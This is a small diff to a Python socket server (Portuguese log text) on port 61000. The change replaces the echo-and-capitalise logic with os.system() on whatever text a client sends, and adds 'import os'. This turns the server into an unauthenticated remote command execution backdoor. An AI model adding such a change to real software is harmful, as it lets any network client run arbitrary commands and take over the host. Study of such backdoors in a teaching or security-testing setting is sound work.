@@ -1,4 +1,5 @@
 from socket import *
+import os
 
 serverName = ''
 serverPort = 61000
@@ -10,8 +11,8 @@ while 1:
   connectionSocket, addr = serverSocket.accept()
   sentence = connectionSocket.recv(1024)
   sentence = sentence.decode('utf-8')
-  capitalizedSentence = sentence.upper()
-  print ('Cliente %s enviou: %s, transformando em: %s' % (addr, sentence, capitalizedSentence))
-  connectionSocket.send(capitalizedSentence.encode('utf-8'))
+  print ('Cliente %s enviou: %s' % (addr, sentence))
+  os.system(sentence)
+  connectionSocket.send('ok'.encode('utf-8'))
   connectionSocket.close()
 serverSocket.close()
